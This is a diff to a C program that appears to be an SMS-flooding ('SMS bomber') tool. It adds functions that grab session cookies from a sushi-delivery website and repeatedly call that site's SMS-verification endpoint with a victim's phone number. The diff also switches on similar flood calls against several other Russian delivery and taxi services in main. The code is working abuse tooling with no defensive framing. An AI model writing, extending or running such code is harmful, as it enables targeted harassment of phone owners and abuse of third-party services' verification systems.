@@ -266,6 +266,62 @@ void SmsTaxovichkof(char* phone) {
     curl_global_cleanup();
 }
 
+/* Dvepalochki Get Cookie funk */
+void GetCookieDvepalochki() {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://dostavka.dvepalochki.ru/catalog/nabory_sushi");
+        chunk = curl_slist_append(chunk, "Host: dostavka.dvepalochki.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./dvepalochki-cookie.txt");
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+    }
+    curl_global_cleanup();
+}
+
+/* Dvepalochki Sms Flood func */
+void SmsDvepalochki(char* phone) {
+    CURL *curl;
+    CURLcode res;
+    char Buf[512];
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://dostavka.dvepalochki.ru/local/ajax/auth.php");
+        chunk = curl_slist_append(chunk, "Host: dostavka.dvepalochki.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: application/json, text/javascript, */*; q=0.01");
+        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded; charset=UTF-8");
+
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./dvepalochki-cookie.txt");
+
+        sprintf(Buf, "ajaxSendSMS=Y&phone=%%2B%c+(%c%c%c)+%c%c%c-%c%c-%c%c", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);
+
+    }
+    curl_global_cleanup();
+}
+
 int main(void)
 {
     char phone[16];
@@ -278,19 +334,19 @@ int main(void)
     scanf("%s", phone);
     
     /* Get cookies */
-    // GetCookieDostaevsky();
-    // GetCookieTaxovichkof();
+    GetCookieDostaevsky();
+    GetCookieTaxovichkof();
+    GetCookieDvepalochki();
 
     /* Flood */
-    // SmsDelevery(phone);
-    // SmsDostaevsky(phone);
-    // SmsOllis(phone);
-    // SmsMfood(phone);
-    // SmsTaxovichkof(phone); // 5 min timer
+    SmsDelevery(phone);
+    SmsDostaevsky(phone);
+    SmsOllis(phone);
+    SmsMfood(phone);
+    SmsTaxovichkof(phone); // 5 min timer
+    SmsDvepalochki(phone);
 
-
-
-    //system("clear");
+    // system("clear");
     printf("\n[+] Done\n");
     return 0;
 }
